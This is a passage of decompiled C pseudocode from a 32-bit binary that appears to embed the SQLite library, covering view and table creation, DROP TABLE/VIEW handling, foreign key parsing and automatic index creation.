        sub_1007E480(a1, a4, (unsigned __int8 *)v30);
        sub_1005ABD1((int)v36, 42, 1);
        if ( !*(_DWORD *)(a1 + 64) )
        {
          result = sub_1007C1CE((int *)a1, (int)a4);
          if ( !result )
            return result;
          *(_DWORD *)(v6 + 12) = result[3];
          *(_DWORD *)(v6 + 16) = result[4];
          result[3] = 0;
          result[4] = 0;
          sub_1006A1BB((unsigned int)result);
        }
        v13 = sub_1006AC5B(v6, v38);
        v11 = a1;
      }
      else
      {
        v13 = (_BYTE *)sub_10055484(
                         v38,
                         "CREATE %s %.*s",
                         v12,
                         *a3 - *(_DWORD *)(a1 + 480) + 1,
                         *(const char **)(a1 + 480));
      }
      v14 = (unsigned int)v13;
      v15 = aSqliteTempMast_2;
      if ( v37 != 1 )
        v15 = aSqliteMaster_2;
      v26 = *(_DWORD *)(v11 + 408);
      v25 = *(_DWORD *)(v11 + 412);
      v24 = *(_DWORD *)(v6 + 4);
      v23 = *(_DWORD *)(*(_DWORD *)(v38 + 8) + 16 * v37);
      v34 = 16 * v37;
      sub_10069DB8(v11, aUpdateQSSetTyp, v23, v15, v35, v24, v24, v25, v13, v26);
      sub_10058EC7(v38, v14);
      sub_1006AB7A((_DWORD *)a1, v37);
      if ( (*(_BYTE *)(v6 + 34) & 8) != 0 )
      {
        v17 = (_DWORD *)(v34 + *(_DWORD *)(v38 + 8));
        v16 = v17[3];
        if ( !*(_DWORD *)(v16 + 68) )
        {
          sub_10069DB8(a1, aCreateTableQSq, *v17);
          v16 = v27;
        }
      }
      v18 = v38;
      v19 = (unsigned __int16 *)sub_10055484(v38, aTblNameQ, *(_DWORD *)(v6 + 4), v16);
      result = (int *)sub_1005AC02(v36, 98, v37, 0, 0, v19, (_BYTE *)0xFFFFFFFF);
      if ( *(_BYTE *)(v18 + 124) )
      {
LABEL_26:
        v20 = sub_10059297(*(_BYTE **)(v6 + 4));
        v8 = sub_10069032((unsigned int *)(v21 + 4), v22, (int)v20, (int *)v6) == 0;
        result = (int *)v38;
        if ( v8 )
        {
          *(_DWORD *)(a1 + 500) = 0;
          ++result[10];
          result[3] |= 0x200u;
          if ( !*(_DWORD *)(v6 + 28) )
          {
            if ( !*a2 )
              a2 = a3;
            result = (int *)(sub_10070AAB(*(unsigned __int8 **)(a1 + 480), *a2 - *(_DWORD *)(a1 + 480)) + 13);
            *(_DWORD *)(v6 + 48) = result;
          }
        }
        else
        {
          *(_BYTE *)(v38 + 30) = 1;
        }
      }
    }
  }
  return result;
}
// 1006B01F: variable 'v27' is possibly undefined
// 1006B02E: variable 'v16' is possibly undefined
// 1006B060: variable 'v21' is possibly undefined
// 1006B065: variable 'v22' is possibly undefined

//----- (1006B0BD) --------------------------------------------------------
void __usercall sub_1006B0BD(int *a1@<eax>, int *a2, int a3, int a4, unsigned int a5, int a6, int a7)
{
  bool v8; // cc
  int v9; // esi
  int v10; // edi
  int v11; // eax
  int v12; // esi
  _BYTE *v13; // eax
  int v14; // ecx
  int i; // eax
  int v16; // eax
  int v17; // ecx
  bool v18; // zf
  int *v19; // edi
  int v20; // eax
  int v21; // eax
  int v22; // edi
  int v23; // eax
  int *v24; // eax
  int v25; // edi
  const char *v26; // edx
  int v27; // esi
  char *v28; // edx
  int v29; // ecx
  int v30; // ecx
  _DWORD *v31; // eax
  int v32; // esi
  unsigned __int16 *v33; // eax
  _BYTE *v34; // eax
  int v35; // edx
  unsigned __int8 *v36; // ecx
  int v37; // eax
  int v38; // esi
  unsigned __int8 *v39; // ebx
  int v40; // [esp-20h] [ebp-D0h]
  int v41; // [esp-Ch] [ebp-BCh]
  int v42; // [esp-4h] [ebp-B4h]
  int v43; // [esp-4h] [ebp-B4h]
  int v44[17]; // [esp+10h] [ebp-A0h] BYREF
  int *v45[4]; // [esp+54h] [ebp-5Ch] BYREF
  int v46[9]; // [esp+64h] [ebp-4Ch] BYREF
  int v47; // [esp+88h] [ebp-28h]
  int v48[2]; // [esp+8Ch] [ebp-24h] BYREF
  int *v49; // [esp+94h] [ebp-1Ch]
  char *v50; // [esp+98h] [ebp-18h]
  int *v51; // [esp+9Ch] [ebp-14h]
  int v52; // [esp+A0h] [ebp-10h]
  int *v53; // [esp+A4h] [ebp-Ch] BYREF
  int v54; // [esp+A8h] [ebp-8h]
  int v55; // [esp+ACh] [ebp-4h]

  v8 = a1[111] <= 0;
  v9 = *a1;
  v55 = *a1;
  if ( !v8 )
  {
    sub_10059320(a1, aParametersAreN);
LABEL_3:
    sub_1007B016(v9, a5);
    return;
  }
  sub_1006A41E(a4, (int)a1, a3, a6, 1, 0, a7);
  v10 = a1[125];
  if ( !v10 )
    goto LABEL_3;
  sub_1006A35E(a4, a1, (int *)&v53, a3);
  v11 = sub_1005855F(v55, *(_DWORD *)(v10 + 68));
  if ( sub_10078FDE(v45, v11, a1, (int *)aView_1, v53) && sub_100790B2((int)v45, a5) )
  {
    sub_1007B016(v55, a5);
    return;
  }
  v12 = v55;
  *(_DWORD *)(v10 + 28) = sub_100765C5(v55, a5, 1);
  sub_1007B016(v12, a5);
  if ( !*(_BYTE *)(v12 + 30) )
  {
    if ( !*(_BYTE *)(v12 + 124) )
      sub_1006B423(a1, v10);
    v13 = (_BYTE *)a1[122];
    if ( *v13 && *v13 != 59 )
      v13 += a1[123];
    v14 = *a2;
    for ( i = (int)&v13[-*a2]; i > 0 && (byte_100FEFC0[*(unsigned __int8 *)(v14 + i - 1)] & 1) != 0; --i )
      ;
    v51 = 0;
    v16 = v14 + i - 1;
    v17 = *a1;
    v18 = *(_BYTE *)(*a1 + 30) == 0;
    v48[0] = v16;
    v48[1] = 1;
    v54 = v17;
    if ( v18 )
    {
      v55 = a1[125];
      v19 = (int *)v55;
      if ( v55 )
      {
        v20 = sub_1005855F(v17, *(_DWORD *)(v55 + 68));
        v18 = v19[11] == 0;
        v52 = v20;
        if ( !v18 )
        {
          memset(v46, 0, sizeof(v46));
          memset(v44, 0, 0x40u);
          v21 = v19[1];
          v44[8] = -1;
          v44[3] = v21;
          v44[5] = (int)v19;
          v22 = v19[11];
          LOWORD(v44[0]) = 1;
          v46[0] = (int)a1;
          v46[1] = (int)v44;
          BYTE2(v46[5]) = 1;
          if ( sub_1008003C(v22, (int)v46) )
            return;
          v19 = (int *)v55;
        }
        v23 = v54;
        if ( *(_BYTE *)(v54 + 124) )
        {
          v19[6] = *(_DWORD *)(v54 + 120);
          if ( *(_BYTE *)(v23 + 124) )
            goto LABEL_36;
        }
        v24 = sub_1007C271(a1);
        v49 = v24;
        if ( v24 )
        {
          sub_1005ABD1((int)v24, 42, 0);
          v25 = v55;
          if ( *(_DWORD *)(v55 + 28) )
          {
            v50 = aView;
            v26 = aView_0;
          }
          else
          {
            v50 = aTable;
            v26 = aTable_0;
          }
          v27 = v54;
          v53 = (int *)sub_10055484(v54, "CREATE %s %.*s", v26, v48[0] - a1[120] + 1, (const char *)a1[120]);
          v28 = aSqliteTempMast_2;
          if ( v52 != 1 )
            v28 = aSqliteMaster_2;
          v42 = a1[102];
          v29 = *(_DWORD *)(v25 + 4);
          v41 = a1[103];
          v40 = *(_DWORD *)(16 * v52 + *(_DWORD *)(v27 + 8));
          v47 = 16 * v52;
          sub_10069DB8((int)a1, aUpdateQSSetTyp, v40, v28, v50, v29, v29, v41, v53, v42);
          sub_10058EC7(v27, (unsigned int)v53);
          sub_1006AB7A(a1, v52);
          if ( (*(_BYTE *)(v55 + 34) & 8) != 0 )
          {
            v31 = (_DWORD *)(v47 + *(_DWORD *)(v27 + 8));
            v30 = v31[3];
            if ( !*(_DWORD *)(v30 + 68) )
            {
              sub_10069DB8((int)a1, aCreateTableQSq, *v31);
              v30 = v43;
            }
          }
          v32 = v54;
          v33 = (unsigned __int16 *)sub_10055484(v54, aTblNameQ, *(_DWORD *)(v55 + 4), v30);
          sub_1005AC02(v49, 98, v52, 0, 0, v33, (_BYTE *)0xFFFFFFFF);
          v19 = (int *)v55;
          if ( *(_BYTE *)(v32 + 124) )
          {
LABEL_36:
            v34 = sub_10059297((_BYTE *)v19[1]);
            v18 = sub_10069032((unsigned int *)(v35 + 4), v36, (int)v34, v19) == 0;
            v37 = v54;
            if ( v18 )
            {
              v38 = v55;
              a1[125] = 0;
              ++*(_DWORD *)(v37 + 40);
              *(_DWORD *)(v37 + 12) |= 0x200u;
              if ( !*(_DWORD *)(v38 + 28) )
              {
                v39 = (unsigned __int8 *)a1[120];
                if ( !*v51 )
                  v51 = v48;
                *(_DWORD *)(v38 + 48) = sub_10070AAB(v39, *v51 - (_DWORD)v39) + 13;
              }
            }
            else
            {
              *(_BYTE *)(v54 + 30) = 1;
            }
          }
        }
      }
    }
  }
}
// 1006B37D: variable 'v43' is possibly undefined
// 1006B38F: variable 'v30' is possibly undefined
// 1006B3C4: variable 'v35' is possibly undefined
// 1006B3C9: variable 'v36' is possibly undefined

//----- (1006B423) --------------------------------------------------------
int __cdecl sub_1006B423(int *a1, int a2)
{
  int v3; // edi
  int v5; // eax
  _DWORD *v6; // edx
  int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // [esp+Ch] [ebp-Ch]
  int v10; // [esp+10h] [ebp-8h]
  int v11; // [esp+14h] [ebp-4h]
  char v12; // [esp+23h] [ebp+Bh]

  v11 = 0;
  v3 = *a1;
  if ( sub_10071427(a2, a1) )
    return 1;
  if ( (*(_BYTE *)(a2 + 34) & 0x10) != 0 )
    return 0;
  v5 = *(_DWORD *)(a2 + 12);
  if ( v5 > 0 )
    return 0;
  if ( v5 < 0 )
  {
    sub_10059320(a1, "view %s is circularly defined", *(const char **)(a2 + 4));
    return 1;
  }
  v6 = sub_100765C5(v3, *(_DWORD *)(a2 + 28), 0);
  v9 = (unsigned int)v6;
  if ( !v6 )
    return 1;
  v12 = *(_BYTE *)(v3 + 226);
  v10 = a1[17];
  sub_1006C7A7((int)a1, (__int16 *)v6[2]);
  *(_DWORD *)(a2 + 12) = -1;
  *(_BYTE *)(v3 + 226) = 0;
  v8 = sub_1007C1CE(a1, v7);
  *(_BYTE *)(v3 + 226) = v12;
  a1[17] = v10;
  if ( v8 )
  {
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v8 + 12);
    *(_DWORD *)(a2 + 16) = *(_DWORD *)(v8 + 16);
    *(_DWORD *)(v8 + 12) = 0;
    *(_DWORD *)(v8 + 16) = 0;
    sub_1006A1BB(v8);
    *(_WORD *)(*(_DWORD *)(a2 + 68) + 74) |= 2u;
  }
  else
  {
    *(_DWORD *)(a2 + 12) = 0;
    v11 = 1;
  }
  sub_1007B016(v3, v9);
  return v11;
}
// 1006B4B2: variable 'v7' is possibly undefined
// 1007C1CE: using guessed type _DWORD __cdecl sub_1007C1CE(_DWORD, _DWORD);

//----- (1006B518) --------------------------------------------------------
int __usercall sub_1006B518@<eax>(int a1@<eax>, int a2)
{
  int v2; // ebx
  int result; // eax
  _DWORD *i; // esi
  int *v5; // edi

  v2 = 16 * a1;
  result = *(_DWORD *)(16 * a1 + *(_DWORD *)(a2 + 8) + 12);
  if ( (*(_BYTE *)(result + 74) & 2) != 0 )
  {
    for ( i = *(_DWORD **)(result + 12); i; i = (_DWORD *)*i )
    {
      v5 = (int *)i[2];
      if ( v5[7] )
        sub_1006A14E(v5);
    }
    result = *(_DWORD *)(v2 + *(_DWORD *)(a2 + 8) + 12);
    *(_WORD *)(result + 74) &= ~2u;
  }
  return result;
}

//----- (1006B563) --------------------------------------------------------
int __usercall sub_1006B563@<eax>(int a1@<eax>, int *a2@<ecx>, int a3)
{
  int v5; // ebx
  int v6; // edx
  char *v7; // eax

  sub_1007C271(a2);
  v5 = sub_10078A55((int)a2);
  sub_1005AB66(v6, 92, a3, v5, a1);
  sub_1006CB6D(a2);
  v7 = aSqliteTempMast_3;
  if ( a1 != 1 )
    v7 = aSqliteMaster_3;
  sub_10069DB8((int)a2, aUpdateQSSetRoo, *(_DWORD *)(*(_DWORD *)(*a2 + 8) + 16 * a1), v7, a3, v5, v5);
  return sub_10078A70((int)a2, v5);
}
// 1006B586: variable 'v6' is possibly undefined

//----- (1006B5CF) --------------------------------------------------------
int __usercall sub_1006B5CF@<eax>(_DWORD *a1@<edi>, int *a2)
{
  int i; // edx
  int v3; // ebx
  int result; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // [esp+8h] [ebp-4h]

  v7 = a1[6];
  for ( i = 0; ; i = v3 )
  {
    v3 = 0;
    if ( !i || v7 < i )
      v3 = v7;
    for ( result = a1[5]; result; result = *(_DWORD *)(result + 32) )
    {
      v5 = *(_DWORD *)(result + 20);
      if ( (!i || v5 < i) && v5 > v3 )
        v3 = *(_DWORD *)(result + 20);
    }
    if ( !v3 )
      break;
    v6 = sub_1005855F(*a2, a1[17]);
    sub_1006B563(v6, a2, v3);
  }
  return result;
}

//----- (1006B62B) --------------------------------------------------------
void __cdecl sub_1006B62B(int *a1, int a2, int a3, int a4)
{
  int *v4; // eax
  int v5; // ebx
  _BYTE *v6; // esi
  _DWORD *v7; // esi
  int i; // ebx
  char *v9; // eax
  int *v10; // [esp+10h] [ebp-10h]
  int *v11; // [esp+14h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h]

  v12 = *a1;
  if ( *(_BYTE *)(*a1 + 30) )
    goto LABEL_33;
  v4 = sub_10069EB7((int)a1, a3, *(unsigned __int8 **)(a2 + 12), *(unsigned __int8 **)(a2 + 8));
  v5 = (int)v4;
  v10 = v4;
  if ( v4 )
  {
    v13 = sub_1005855F(v12, v4[17]);
    if ( (*(_BYTE *)(v5 + 34) & 0x10) != 0 && sub_1006B423(a1, v5) )
      goto LABEL_33;
    v6 = *(_BYTE **)(v5 + 4);
    if ( !sub_100593F9(v6, 7, (unsigned __int8 *)aSqlite_0) )
    {
      sub_10059320(a1, aTableSMayNotBe, v6);
      goto LABEL_33;
    }
    if ( a3 )
    {
      if ( !*(_DWORD *)(v5 + 28) )
      {
        sub_10059320(a1, aUseDropTableTo, v6);
        goto LABEL_33;
      }
    }
    else if ( *(_DWORD *)(v5 + 28) )
    {
      sub_10059320(a1, aUseDropViewToD, v6);
      goto LABEL_33;
    }
    v11 = sub_1007C271(a1);
    if ( !v11 )
    {
LABEL_32:
      sub_1006B518(v13, v12);
      goto LABEL_33;
    }
    v7 = (_DWORD *)(16 * v13 + *(_DWORD *)(v12 + 8));
    sub_1006CB39(a1, v13, 1);
    if ( (*(_BYTE *)(v5 + 34) & 0x10) != 0 )
      sub_1005ABB9((int)v11, 121);
    sub_1008105F((int)a1, (__int16 *)a2, v5);
    for ( i = sub_1007281E(a1, v5); i; i = *(_DWORD *)(i + 32) )
      sub_10072F93(a1, i);
    if ( (*((_BYTE *)v10 + 34) & 8) != 0 )
      sub_10069DB8((int)a1, aDeleteFromSSql, *v7, v10[1]);
    v9 = aSqliteTempMast_4;
    if ( v13 != 1 )
      v9 = aSqliteMaster_4;
    sub_10069DB8((int)a1, aDeleteFromQSWh, *v7, v9, v10[1]);
    if ( sub_10069E40(v12, (unsigned __int8 *)aSqliteStat1, *(unsigned __int8 **)(16 * v13 + *(_DWORD *)(v12 + 8))) )
      sub_10069DB8((int)a1, aDeleteFromQSql, *v7, v10[1]);
    if ( !a3 )
    {
      if ( (*((_BYTE *)v10 + 34) & 0x10) != 0 )
        goto LABEL_30;
      sub_1006B5CF(v10, a1);
    }
    if ( (*((_BYTE *)v10 + 34) & 0x10) == 0 )
    {
LABEL_31:
      sub_1005AC02(v11, 100, v13, 0, 0, (unsigned __int16 *)v10[1], 0);
      sub_1006AB7A(a1, v13);
      goto LABEL_32;
    }
LABEL_30:
    sub_1005AC02(v11, 123, v13, 0, 0, (unsigned __int16 *)v10[1], 0);
    goto LABEL_31;
  }
  if ( a4 )
    sub_1005934E(a1);
LABEL_33:
  sub_1006C7F7((__int16 *)a2, v12);
}

//----- (1006B82C) --------------------------------------------------------
void __usercall sub_1006B82C(int a1@<eax>, int a2, int *a3, int *a4, __int16 a5)
{
  _DWORD *v5; // edi
  unsigned int v7; // esi
  int v8; // eax
  int *v9; // edx
  size_t v10; // esi
  int v11; // eax
  _BYTE **v12; // edx
  _BYTE *v13; // eax
  int v14; // edx
  bool v15; // zf
  _DWORD *v16; // eax
  char *v17; // edi
  char *v18; // edi
  int v19; // eax
  int *v20; // edx
  int v21; // ebx
  _BYTE *v22; // eax
  int v23; // edx
  _BYTE *v24; // ecx
  _BYTE *v25; // eax
  unsigned __int8 *v26; // ecx
  int *v27; // eax
  unsigned __int8 *v28; // [esp+Ch] [ebp-24h]
  _BYTE *v29; // [esp+Ch] [ebp-24h]
  _DWORD *v30; // [esp+10h] [ebp-20h]
  int v31; // [esp+14h] [ebp-1Ch]
  int v32; // [esp+14h] [ebp-1Ch]
  _DWORD *v33; // [esp+14h] [ebp-1Ch]
  int v34; // [esp+18h] [ebp-18h]
  unsigned __int8 **v35; // [esp+1Ch] [ebp-14h]
  int v36; // [esp+20h] [ebp-10h]
  int v37; // [esp+24h] [ebp-Ch]
  int v38; // [esp+28h] [ebp-8h]
  int v39; // [esp+2Ch] [ebp-4h]
  char **v40; // [esp+38h] [ebp+8h]

  v5 = *(_DWORD **)(a2 + 500);
  v7 = 0;
  v38 = *(_DWORD *)a2;
  v30 = v5;
  if ( v5 && !*(_BYTE *)(a2 + 520) )
  {
    if ( a3 )
    {
      if ( a4 && *a4 != *a3 )
      {
        sub_10059320((int *)a2, aNumberOfColumn);
        goto LABEL_42;
      }
      v9 = a4;
      v37 = *a3;
    }
    else
    {
      v8 = v5[3] - 1;
      if ( v8 < 0 )
        goto LABEL_42;
      v9 = a4;
      if ( a4 && *a4 != 1 )
      {
        sub_10059320((int *)a2, aForeignKeyOnSS, *(_DWORD *)(24 * v8 + v5[4]), a1);
        goto LABEL_42;
      }
      v37 = 1;
    }
    v10 = *(_DWORD *)(a1 + 4) + 8 * v37 + 37;
    if ( v9 )
    {
      v11 = *v9;
      if ( *v9 > 0 )
      {
        v12 = (_BYTE **)(v9[3] + 4);
        v31 = v11;
        do
        {
          v13 = sub_10059297(*v12);
          v12 = (_BYTE **)(v14 + 20);
          v15 = v31-- == 1;
          v10 += (size_t)(v13 + 1);
        }
        while ( !v15 );
      }
    }
    v16 = sub_1005904B(v38, v10);
    v7 = (unsigned int)v16;
    if ( v16 )
    {
      *v16 = v5;
      v16[1] = v5[9];
      v17 = (char *)&v16[2 * v37 + 9];
      v16[2] = v17;
      memcpy(v17, *(const void **)a1, *(_DWORD *)(a1 + 4));
      v17[*(_DWORD *)(a1 + 4)] = 0;
      sub_10059363(v17);
      v18 = &v17[*(_DWORD *)(a1 + 4) + 1];
      v19 = v37;
      *(_DWORD *)(v7 + 20) = v37;
      if ( !a3 )
      {
        *(_DWORD *)(v7 + 36) = v30[3] - 1;
        goto LABEL_20;
      }
      v36 = 0;
      if ( v37 <= 0 )
      {
LABEL_20:
        v20 = a4;
        if ( a4 && v19 > 0 )
        {
          v21 = 0;
          v40 = (char **)(v7 + 40);
          v32 = v19;
          while ( 1 )
          {
            v22 = sub_10059297(*(_BYTE **)(v21 + v20[3] + 4));
            *v40 = v18;
            v29 = v22;
            memcpy(v18, *(const void **)(v21 + *(_DWORD *)(v23 + 12) + 4), (size_t)v22);
            v40 += 2;
            v21 += 20;
            v15 = v32-- == 1;
            v29[(_DWORD)v18] = 0;
            v18 = &v29[(_DWORD)v18 + 1];
            if ( v15 )
              break;
            v20 = a4;
          }
        }
        v24 = *(_BYTE **)(v7 + 8);
        *(_BYTE *)(v7 + 25) = a5;
        *(_BYTE *)(v7 + 24) = 0;
        *(_BYTE *)(v7 + 26) = HIBYTE(a5);
        v25 = sub_10059297(v24);
        v27 = sub_10069032((unsigned int *)(v30[17] + 52), v26, (int)v25, (int *)v7);
        if ( v27 == (int *)v7 )
        {
          *(_BYTE *)(v38 + 30) = 1;
        }
        else
        {
          if ( v27 )
          {
            *(_DWORD *)(v7 + 12) = v27;
            v27[4] = v7;
          }
          v30[9] = v7;
          v7 = 0;
        }
        goto LABEL_42;
      }
      v34 = 0;
      v33 = (_DWORD *)(v7 + 36);
      while ( 1 )
      {
        v39 = 0;
        if ( (int)v30[3] > 0 )
        {
          v28 = *(unsigned __int8 **)(a3[3] + v34 + 4);
          v35 = (unsigned __int8 **)v30[4];
          while ( sub_100593BE(*v35, v28) )
          {
            ++v39;
            v35 += 6;
            if ( v39 >= v30[3] )
              goto LABEL_31;
          }
          *v33 = v39;
        }
LABEL_31:
        if ( v39 >= v30[3] )
          break;
        ++v36;
        v19 = v37;
        v34 += 20;
        v33 += 2;
        if ( v36 >= v37 )
          goto LABEL_20;
      }
      sub_10059320((int *)a2, "unknown column \"%s\" in foreign key definition", *(const char **)(20 * v36 + a3[3] + 4));
    }
  }
LABEL_42:
  sub_10058EC7(v38, v7);
  sub_100767B1(a3, v38);
  sub_100767B1(a4, v38);
}
// 1006B8F4: variable 'v14' is possibly undefined
// 1006BA3B: variable 'v23' is possibly undefined
// 1006BA87: variable 'v26' is possibly undefined

//----- (1006BAD2) --------------------------------------------------------
int __usercall sub_1006BAD2@<eax>(int a1@<eax>, char a2)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 500);
  if ( result )
  {
    result = *(_DWORD *)(result + 36);
    if ( result )
      *(_BYTE *)(result + 24) = a2;
  }
  return result;
}

//----- (1006BAEE) --------------------------------------------------------
int *__usercall sub_1006BAEE@<eax>(int *a1@<eax>, int a2, int a3)
{
  int v4; // ebx
  int v5; // esi
  int *result; // eax
  int *v7; // ebx
  unsigned __int16 *v8; // eax
  unsigned __int16 *v9; // eax
  int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+10h] [ebp-10h]
  int v12; // [esp+14h] [ebp-Ch]
  int v13; // [esp+14h] [ebp-Ch]
  int v14; // [esp+18h] [ebp-8h]
  int v15; // [esp+1Ch] [ebp-4h]

  v4 = *(_DWORD *)(a2 + 16);
  v15 = a1[17];
  v14 = v15 + 1;
  a1[17] = v15 + 2;
  v10 = v4;
  v5 = sub_1005855F(*a1, *(_DWORD *)(a2 + 36));
  sub_10069AEC((int)a1, *(_DWORD *)(v4 + 24), v5, 1, *(_DWORD *)(v4 + 4));
  result = sub_1007C271(a1);
  v7 = result;
  if ( result )
  {
    if ( a3 < 0 )
    {
      v12 = *(_DWORD *)(a2 + 20);
      sub_1005ABE8((int)result, 95, v12, v5);
    }
    else
    {
      v12 = a3;
    }
    v8 = (unsigned __int16 *)sub_1006CBB6(a1, (_DWORD *)a2);
    sub_1005AC02(v7, 39, v14, v12, v5, v8, (_BYTE *)0xFFFFFFF0);
    if ( a3 >= 0 )
      sub_1005AE0E((int)v7, 1);
    sub_100791F0(v10, a1, v15, v5, 38);
    v11 = sub_1005ABE8((int)v7, 64, v15, 0);
    v13 = sub_10078A55((int)a1);
    v9 = (unsigned __int16 *)sub_100808B0(a1, (_DWORD *)a2, v15, v13, 1);
    if ( *(_BYTE *)(a2 + 24) )
    {
      sub_1005AC02(v7, 50, v14, v7[3] + 2, (int)v9 + *(_DWORD *)(a2 + 4), v9, (_BYTE *)0xFFFFFFF2);
      sub_1006CB81(a1, 2, (unsigned __int16 *)aIndexedColumns, (_BYTE *)0xFFFFFFFE);
    }
    sub_1005ABE8((int)v7, 67, v14, v13);
    sub_1005AE0E((int)v7, 16);
    sub_10078A70((int)a1, v13);
    sub_1005ABE8((int)v7, 66, v15, v11 + 1);
    sub_1005AE20(v11, (int)v7);
    sub_1005ABD1((int)v7, 42, v15);
    return (int *)sub_1005ABD1((int)v7, 42, v14);
  }
  return result;
}

//----- (1006BC68) --------------------------------------------------------
int __usercall sub_1006BC68@<eax>(
        int a1@<eax>,
        int *a2,
        int a3,
        int a4,
        int *a5,
        int a6,
        int a7,
        _DWORD *a8,
        char a9,
        int a10)
{
  int v11; // eax
  bool v12; // zf
  int v13; // esi
  int *v14; // eax
  int *v15; // edi
  int *v16; // esi
  _BYTE *v17; // esi
  unsigned __int8 **v18; // ebx
  _BYTE *v19; // eax
  int v20; // eax
  int v21; // ecx
  int *v22; // eax
  int *v23; // eax
  int *v24; // esi
  int v25; // edi
  int v26; // edx
  int v27; // esi
  _BYTE **v28; // eax
  _BYTE *v29; // eax
  _BYTE *v30; // esi
  int *v31; // ebx
  int v32; // eax
  int v33; // eax
  int v34; // eax
  int v35; // eax
  int *v36; // esi
  int v37; // edx
  void *v38; // ecx
  bool v39; // cc
  unsigned __int8 *v40; // eax
  void *v41; // eax
  _BYTE **v42; // ecx
  const void *v43; // ecx
  int v44; // eax
  int v45; // edx
  int i; // esi
  int v47; // eax
  int v48; // edi
  int v49; // ecx
  int v50; // edx
  unsigned __int8 *v51; // ecx
  unsigned __int8 *v52; // edx
  int v53; // esi
  _BYTE *v54; // eax
  unsigned __int8 *v55; // ecx
  char v56; // al
  char v57; // cl
  unsigned __int8 *v58; // esi
  const char *v59; // ecx
  int v60; // esi
  char *v61; // eax
  int v62; // ecx
  unsigned __int16 *v63; // eax
  int *v64; // ecx
  int v65; // eax
  void *v67; // [esp-8h] [ebp-64h]
  int *v68[4]; // [esp+Ch] [ebp-50h] BYREF
  _BYTE *v69; // [esp+1Ch] [ebp-40h] BYREF
  int j; // [esp+20h] [ebp-3Ch]
  int *v71; // [esp+24h] [ebp-38h]
  int v72; // [esp+28h] [ebp-34h]
  unsigned __int8 *v73; // [esp+2Ch] [ebp-30h]
  void *v74; // [esp+30h] [ebp-2Ch]
  unsigned __int8 **v75; // [esp+34h] [ebp-28h]
  int v76; // [esp+38h] [ebp-24h]
  void *v77; // [esp+3Ch] [ebp-20h]
  int *v78; // [esp+40h] [ebp-1Ch] BYREF
  int v79; // [esp+44h] [ebp-18h]
  int *v80; // [esp+48h] [ebp-14h]
  int v81; // [esp+4Ch] [ebp-10h]
  void *Src; // [esp+50h] [ebp-Ch]
  int v83; // [esp+54h] [ebp-8h]

  v11 = *a2;
  v12 = *(_BYTE *)(*a2 + 30) == 0;
  v71 = 0;
  Src = 0;
  v83 = v11;
  v78 = 0;
  v76 = 0;
  if ( !v12 || *((_BYTE *)a2 + 520) || sub_10058497(a2) )
    goto LABEL_106;
  if ( !a4 )
  {
    v16 = (int *)a2[125];
    v80 = v16;
    if ( !v16 )
      goto LABEL_106;
    v15 = v80;
    v81 = sub_1005855F(v83, v16[17]);
LABEL_18:
    v17 = (_BYTE *)v15[1];
    v18 = (unsigned __int8 **)(16 * v81 + *(_DWORD *)(v83 + 8));
    v72 = 16 * v81;
    v75 = v18;
    if ( !sub_100593F9(v17, 7, (unsigned __int8 *)aSqlite_1) && memcmp(v17 + 7, aAltertab, 9u) )
    {
      sub_10059320(a2, aTableSMayNotBe_0, v15[1]);
      goto LABEL_106;
    }
    if ( v15[7] )
    {
      sub_10059320(a2, aViewsMayNotBeI);
      goto LABEL_106;
    }
    if ( (*((_BYTE *)v15 + 34) & 0x10) != 0 )
    {
      sub_10059320(a2, aVirtualTablesM);
      goto LABEL_106;
    }
    if ( v78 )
    {
      v19 = (_BYTE *)sub_1006A297((int)v78, v83);
      Src = v19;
      if ( !v19 || sub_1006A3D4((int)a2, v19) )
        goto LABEL_106;
      if ( !*(_BYTE *)(v83 + 124) )
      {
        if ( sub_10069E40(v83, (unsigned __int8 *)Src, 0) )
        {
          sub_10059320(a2, aThereIsAlready_0, Src);
          goto LABEL_106;
        }
        v18 = v75;
      }
      if ( sub_10069F30((unsigned __int8 *)Src, *v18) )
      {
        if ( !a10 )
          sub_10059320(a2, aIndexSAlreadyE, Src);
        goto LABEL_106;
      }
    }
    else
    {
      v20 = v15[5];
      v21 = 1;
      while ( v20 )
      {
        v20 = *(_DWORD *)(v20 + 32);
        ++v21;
      }
      Src = (void *)sub_10055484(v83, "sqlite_autoindex_%s_%d", (const char *)v15[1], v21);
      if ( !Src )
        goto LABEL_106;
    }
    v22 = a5;
    if ( !a5 )
    {
      v69 = *(_BYTE **)(24 * v80[3] + v80[4] - 24);
      j = (int)sub_10059297(v69);
      v23 = sub_100766CA(a2, 0, 0);
      v24 = v23;
      a5 = v23;
      if ( !v23 )
        goto LABEL_106;
      sub_1007674E((char *)v23, (int)&v69, a2, 0);
      *(_BYTE *)(v24[3] + 12) = a9;
      v22 = v24;
    }
    v25 = *v22;
    if ( *v22 > 0 )
    {
      v26 = v22[3];
      v27 = *v22;
      do
      {
        if ( *(_DWORD *)v26 )
        {
          v28 = *(_BYTE ***)(*(_DWORD *)v26 + 20);
          if ( v28 )
          {
            v29 = sub_10059297(*v28);
            v76 += (int)(v29 + 1);
          }
        }
        v26 += 20;
        --v27;
      }
      while ( v27 );
    }
    v30 = sub_10059297(Src);
    v31 = sub_1005904B(v83, (size_t)&v30[13 * v25 + 57 + v76]);
    if ( *(_BYTE *)(v83 + 30) )
      goto LABEL_104;
    v31[11] = (int)(v31 + 13);
    v32 = (int)&v31[v25 + 13];
    v31[2] = v32;
    v33 = v32 + 4 * v25;
    v31[3] = v33;
    v34 = v33 + 4 * v25 + 4;
    v31[10] = v34;
    v35 = v25 + v34;
    v67 = Src;
    *v31 = v35;
    v74 = &v30[v35 + 1];
    memcpy((void *)v35, v67, (size_t)(v30 + 1));
    v36 = v80;
    v37 = v72;
    v31[4] = (int)v80;
    v31[1] = *a5;
    *((_BYTE *)v31 + 24) = a6;
    v38 = 0;
    v76 = 0;
    *((_BYTE *)v31 + 25) = v78 == 0;
    v31[9] = *(_DWORD *)(v37 + *(_DWORD *)(v83 + 8) + 12);
    v39 = *a5 <= 0;
    j = (v75[3][72] < 4u) - 1;
    v79 = a5[3];
    if ( !v39 )
    {
      while ( 1 )
      {
        v40 = *(unsigned __int8 **)(v79 + 4);
        v77 = 0;
        v39 = v36[3] <= 0;
        v73 = v40;
